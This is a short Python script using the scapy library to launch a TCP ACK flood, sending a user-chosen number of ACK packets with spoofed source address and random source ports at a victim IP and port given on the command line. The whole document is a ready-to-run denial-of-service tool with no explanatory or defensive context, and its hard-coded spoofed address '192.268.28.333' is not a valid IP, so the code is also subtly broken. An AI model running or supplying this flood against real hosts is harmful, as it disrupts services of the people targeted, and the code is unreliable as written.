import sys
from scapy.all import *
import random


def start_ack_attack(victim_ip,victim_port, packet_count):

 for _ in range(packet_count):
  src_port = random.randint(1024,65535)
  ack_packet = IP(src="192.268.28.333", dst=victim_ip)/TCP(sport=src_port, dport=victim_port,flags="A")
  send(ack_packet)


if __name__== "__main__":
 victim_ip=sys.argv[1]
 victim_port=int(sys.argv[2])
 packet_count=int(sys.argv[3])
 
 start_ack_attack(victim_ip, victim_port, packet_count)


